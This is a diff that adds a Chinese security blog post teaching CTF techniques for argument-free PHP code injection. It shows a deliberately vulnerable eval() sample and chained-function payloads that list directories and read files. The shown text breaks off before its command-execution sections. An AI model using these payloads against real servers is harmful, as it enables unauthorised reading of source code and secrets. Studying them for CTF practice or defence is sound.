@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>PHP无参数读文件和RCE - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="PHP无参数读文件和RCE" />
+<meta property="og:description" content="本文首发于合天智汇：http://www.heetian.com/info/827
+之前做题时遇到了无参数RCE这类题，在网上查找资料发现都是零散的Writeup或者payload，没有一篇能够完整涵盖读取文件和命令执行的技巧，所以我花了点时间，将PHP无参数读文件以及命令执行所用到的方法总结了一遍，希望能对读者起到些许作用。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2020-07-07T15:00:03+08:00" />
+<meta property="article:modified_time" content="2020-07-07T15:00:03+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="PHP无参数读文件和RCE"/>
+<meta name="twitter:description" content="本文首发于合天智汇：http://www.heetian.com/info/827
+之前做题时遇到了无参数RCE这类题，在网上查找资料发现都是零散的Writeup或者payload，没有一篇能够完整涵盖读取文件和命令执行的技巧，所以我花了点时间，将PHP无参数读文件以及命令执行所用到的方法总结了一遍，希望能对读者起到些许作用。"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><link rel="prev" href="https://clq0.top/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" /><link rel="next" href="https://clq0.top/htb-blunder-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PHP无参数读文件和RCE",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/"
+        },"genre": "posts","keywords": "RCE","wordcount":  5056 ,
+        "url": "https:\/\/clq0.top\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/","datePublished": "2020-07-07T15:00:03+08:00","dateModified": "2020-07-07T15:00:03+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">PHP无参数读文件和RCE</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/notes/"><i class="far fa-folder fa-fw"></i>Notes</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-07">2020-07-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5056 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;<span id="/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" class="leancloud_visitors" data-flag-title="PHP无参数读文件和RCE">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#代码解析">代码解析</a></li>
+    <li><a href="#无参数任意文件读取">无参数任意文件读取</a>
+      <ul>
+        <li><a href="#查看当前目录文件名">查看当前目录文件名</a></li>
+        <li><a href="#读取当前目录文件">读取当前目录文件</a></li>
+        <li><a href="#查看上一级目录文件名">查看上一级目录文件名</a></li>
+        <li><a href="#读取上级目录文件">读取上级目录文件</a></li>
+        <li><a href="#查看和读取多层上级路径的就不写了一样的方式套娃就行">查看和读取多层上级路径的就不写了，一样的方式套娃就行</a></li>
+        <li><a href="#查看和读取根目录文件">查看和读取根目录文件</a></li>
+      </ul>
+    </li>
+    <li><a href="#无参数命令执行rce">无参数命令执行(RCE)</a>
+      <ul>
+        <li><a href="#getallheadersapache_request_headers">getallheaders()&amp;apache_request_headers()</a></li>
+        <li><a href="#get_defined_vars">get_defined_vars()</a></li>
+        <li><a href="#session_id">session_id()</a></li>
+        <li><a href="#getenv">getenv()</a></li>
+      </ul>
+    </li>
+    <li><a href="#小结">小结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>本文首发于合天智汇：<a href="http://www.heetian.com/info/827" title="http://www.heetian.com/info/827" target="_blank" rel="noopener noreffer">http://www.heetian.com/info/827</a>
+之前做题时遇到了无参数RCE这类题，在网上查找资料发现都是零散的Writeup或者payload，没有一篇能够完整涵盖读取文件和命令执行的技巧，所以我花了点时间，将PHP无参数读文件以及命令执行所用到的方法总结了一遍，希望能对读者起到些许作用。</p>
+<p>什么是无参数？</p>
+<p>顾名思义，就是只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等</p>
+<p>接下来，从代码开始讲解无参数读文件和RCE的具体技巧，帮助读者熟悉PHP的各种函数、记住无参数读文件和RCE的各类方法：</p>
+<p>例题：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]))</span> <span class="p">{</span>    
+    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="代码解析">代码解析</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])
+</code></pre></td></tr></table>
+</div>
+</div><p>这里使用<code>preg_replace</code>替换匹配到的字符为空，<code>\w</code>匹配字母、数字和下划线，等价于 <code>[^A-Za-z0-9_]</code>，然后<code>(?R)? </code>这个意思为递归整个匹配模式</p>
+<p>所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有<code>;</code></p>
+<p>举个例子：</p>
+<p><code>a(b(c()));</code>可以使用，但是<code>a('b')</code>或者<code>a('b','c')</code>这种含有参数的都不能使用</p>
+<p>所以我们要使用无参数的函数进行文件读取或者命令执行</p>
+<h2 id="无参数任意文件读取">无参数任意文件读取</h2>
+<h3 id="查看当前目录文件名">查看当前目录文件名</h3>
+<p>正常的，<code>print_r(scandir('.'));</code>可以用来查看当前目录所有文件名</p>
+<p>但是要怎么构造参数里这个点呢，这里介绍几个方法：</p>
+<ol>
+<li>
+<p><strong>localeconv()</strong></p>
+<p><code>localeconv()</code>返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>&quot;.&quot;</code>（后续出现的<code>.</code>都用双引号包裹，方便识别）</p>
+</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628190730.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628190730.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628190730.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628190730.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200628190730.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200628190730.png" /></p>
+<p>要怎么取到这个点呢，另一个函数：</p>
+<p><code>current()</code>返回数组中的单元，默认取第一个值：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628191232.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628191232.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628191232.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628191232.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200628191232.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200628191232.png" /></p>
+<p><code>print_r(scandir(current(localeconv())));</code>成功打印出当前目录下文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628192819.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628192819.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628192819.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200628192819.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200628192819.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200628192819.png" /></p>
+<p>或者使用<code>print_r(scandir(pos(localeconv())));</code>，<code>pos</code>是<code>current</code>的别名</p>
+<p>如果都被过滤还可以使用<code>reset()</code>，该函数返回数组第一个单元的值，如果数组为空则返回 <code>FALSE</code></p>
+<ol start="2">
+<li>
+<p><strong>chr(46)</strong></p>
+<p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
+<p>要构造46，有几个方法：</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">chr(rand()) (不实际，看运气)
+
+chr(time())
+
+chr(current(localtime(time())))
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code> chr(time())</code>：</li>
+</ul>
+<p><code>chr()</code>函数以256为一个周期，所以<code>chr(46)</code>,<code>chr(302)</code>,<code>chr(558)</code>都等于<code>&quot;.&quot;</code></p>
+<p>所以使用<code>chr(time())</code>，一个周期必定出现一次<code>&quot;.&quot;</code></p>
+<ul>
+<li><code>chr(current(localtime(time())))</code>：</li>
+</ul>
+<p>数组第一个值每秒+1，所以最多60秒就一定能得到46，用<code>current(pos)</code>就能获得<code>&quot;.&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628210930477.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628210930477.png, https://gitee.com/leonsec/images/raw/master/image-20200628210930477.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628210930477.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628210930477.png"
+        title="image-20200628210930477" /></p>
+<ol start="3">
+<li><strong>phpversion()</strong></li>
+</ol>
+<p><code>phpversion()</code>返回PHP版本，如<code>5.5.9</code></p>
+<p><code>floor(phpversion())</code>返回 <code>5</code></p>
+<p><code>sqrt(floor(phpversion()))</code>返回<code>2.2360679774998</code></p>
+<p><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code> -2.1850398632615</code></p>
+<p><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code> 4.5017381103491</code></p>
+<p><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></p>
+<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628212007839.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628212007839.png, https://gitee.com/leonsec/images/raw/master/image-20200628212007839.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628212007839.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628212007839.png"
+        title="image-20200628212007839" /></p>
+<p><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>&quot;.&quot;</code></p>
+<ol start="4">
+<li><strong>crypt()</strong></li>
+</ol>
+<p><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值，第一个字符随机是<code> $</code>(大概率) 或者 <code>&quot;.&quot;</code>(小概率) 然后通过<code>chr(ord())</code>只取第一个字符</p>
+<p>ps：<code>ord()</code>返回字符串中第一个字符的Ascii值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//（多刷新几次）
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628214006400.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628214006400.png, https://gitee.com/leonsec/images/raw/master/image-20200628214006400.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628214006400.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628214006400.png"
+        title="image-20200628214006400" /></p>
+<p>同理：<code>strrev(crypt(serialize(array())))</code>也可以得到<code>&quot;.&quot;</code>，只不过<code>crypt(serialize(array()))</code>的点出现在最后一个字符，需要使用<code>strrev()</code>逆序，然后使用<code>chr(ord())</code>获取第一个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628214911040.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628214911040.png, https://gitee.com/leonsec/images/raw/master/image-20200628214911040.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628214911040.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628214911040.png"
+        title="image-20200628214911040" /></p>
+<p>PHP的函数如此强大，获取<code>&quot;.&quot;</code>的方法肯定还有许多</p>
+<p>正常的，我们还可以用<code>print_r(scandir('绝对路径'));</code>来查看当前目录文件名</p>
+<p>获取绝对路径可用的有<code>getcwd()</code>和<code>realpath('.')</code></p>
+<p>所以我们还可以用<code>print_r(scandir(getcwd()));</code>输出当前文件夹所有文件名</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628194659883.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628194659883.png, https://gitee.com/leonsec/images/raw/master/image-20200628194659883.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628194659883.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628194659883.png"
+        title="image-20200628194659883" /></p>
+<h3 id="读取当前目录文件">读取当前目录文件</h3>
+<p>通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如PHP源码，我们还需要使用函数读取：</p>
+<p>前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢：</p>
+<p>查询PHP手册发现：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628201903401.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628201903401.png, https://gitee.com/leonsec/images/raw/master/image-20200628201903401.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628201903401.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628201903401.png"
+        title="image-20200628201903401" /></p>
+<p>手册里有这些方法，如果要获取的数组是最后一个我们可以用：</p>
+<p><code>show_source(end(scandir(getcwd())));</code>或者用<code>readfile</code>、<code>highlight_file</code>、<code>file_get_contents</code> 等读文件函数都可以（使用<code>readfile</code>和<code>file_get_contents</code>读文件，显示在源码处）</p>
+<p>ps：<code>readgzfile()</code>也可读文件，常用于绕过过滤</p>
+<p>我们添加<code>zflag.php</code>使其排序在<code>index.php</code>后成为最后一个文件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628200242906.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628200242906.png, https://gitee.com/leonsec/images/raw/master/image-20200628200242906.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628200242906.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628200242906.png"
+        title="image-20200628200242906" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628200601209.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628200601209.png, https://gitee.com/leonsec/images/raw/master/image-20200628200601209.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628200601209.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628200601209.png"
+        title="image-20200628200601209" /></p>
+<p>（出现报错的原因是PHP5.3以上默认只能传递具体的变量，而不能通过函数返回值传递，没有关系不影响我们读文件）</p>
+<p>介绍一个函数：<code>array_reverse()</code> 以相反的元素顺序返回数组</p>
+<p><code>zflag.php</code>本来在最后一位，反过来就成为第一位，可以直接用<code>current(pos)</code>读取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(current(array_reverse(scandir(getcwd()))));
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628201300101.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628201300101.png, https://gitee.com/leonsec/images/raw/master/image-20200628201300101.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628201300101.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628201300101.png"
+        title="image-20200628201300101" /></p>
+<p>如果是倒数第二个我们可以用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(next(array_reverse(scandir(getcwd()))));
+</code></pre></td></tr></table>
+</div>
+</div><p>如果不是数组的最后一个或者倒数第二个呢？</p>
+<p>我们可以使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>是交换数组的键和值，<code>array_rand()</code>是随机返回一个数组</p>
+<p>所以我们可以用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(getcwd()))));
+</code></pre></td></tr></table>
+</div>
+</div><p>或者：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(current(localeconv())))));
+</code></pre></td></tr></table>
+</div>
+</div><p>（可以自己结合前面总结的构造<code>&quot;.&quot;</code>的方法切合实际过滤情况读取，后文就只列举简单的语句）</p>
+<p>多刷新几次，就读到了正着数或者倒着数都是第三位的<code>flag1.php</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628203147224.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628203147224.png, https://gitee.com/leonsec/images/raw/master/image-20200628203147224.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628203147224.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628203147224.png"
+        title="image-20200628203147224" /></p>
+<p>如果目标文件不在当前目录呢？</p>
+<h3 id="查看上一级目录文件名">查看上一级目录文件名</h3>
+<p>再介绍几个函数：</p>
+<p><code>dirname()</code> ：返回路径中的目录部分，比如：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628220531479.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628220531479.png, https://gitee.com/leonsec/images/raw/master/image-20200628220531479.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628220531479.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628220531479.png"
+        title="image-20200628220531479" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628215937381.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628215937381.png, https://gitee.com/leonsec/images/raw/master/image-20200628215937381.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628215937381.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628215937381.png"
+        title="image-20200628215937381" /></p>
+<p>从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
+<p><code>chdir()</code> ：改变当前工作目录</p>
+<ol>
+<li>dirname()方法</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/image-20200628221112400.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20200628221112400.png, https://gitee.com/leonsec/images/raw/master/image-20200628221112400.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20200628221112400.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/image-20200628221112400.png"
+        title="image-20200628221112400" /></p>
+<ol start="2">
+<li>构造<code>&quot;..&quot;</code></li>
+</ol>
+<p><code>print_r(next(scandir(getcwd())));</code>：我们<code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，所以可以用<code>next()</code>获取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件
+</code></pre></td></tr></table>
+</div>
+</div><p>结合上文的一些构造都是可以获得<code>&quot;..&quot;</code>的 ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">next(scandir(chr(ord(hebrevc(crypt(time()))))))
